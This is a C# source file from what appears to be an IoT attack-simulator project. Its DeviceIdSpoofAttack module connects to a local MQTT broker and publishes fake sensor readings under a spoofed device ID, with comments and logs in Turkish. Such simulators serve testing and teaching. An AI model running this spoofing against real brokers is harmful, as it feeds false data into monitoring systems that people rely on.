using MQTTnet;
using MQTTnet.Client;
using System;
using System.Text;
using System.Threading.Tasks;

namespace AttackSimulator
{
    public class DeviceIdSpoofAttack : IAttackModule
    {
        private readonly string fakeDeviceId;
        private readonly int rate;
        private readonly Action<string> log;

        public DeviceIdSpoofAttack(string id, int msgRate, Action<string> logAction)
        {
            fakeDeviceId = id;
            rate = msgRate;
            log = logAction;
        }

        public async Task ExecuteAsync()
        {
            var factory = new MqttFactory();
            var client = factory.CreateMqttClient();
            var options = new MqttClientOptionsBuilder()
                .WithClientId(Guid.NewGuid().ToString())
                .WithTcpServer("localhost", 1883)
                .Build();

            await client.ConnectAsync(options);

            for (int i = 0; i < 10; i++) // sahte cihazdan 10 mesaj gönderelim
            {
                var payload = $"{{\"deviceId\":\"{fakeDeviceId}\",\"temp\":-999,\"timestamp\":\"{DateTime.Now:O}\"}}";
                var message = new MqttApplicationMessageBuilder()
                    .WithTopic($"sensors/{fakeDeviceId}/data")
                    .WithPayload(Encoding.UTF8.GetBytes(payload))
                    .Build();

                await client.PublishAsync(message);
                log($"[Spoof] Sahte mesaj gönderildi: {fakeDeviceId}");
                await Task.Delay(1000 / rate);
            }

            await client.DisconnectAsync();
        }
    }
}
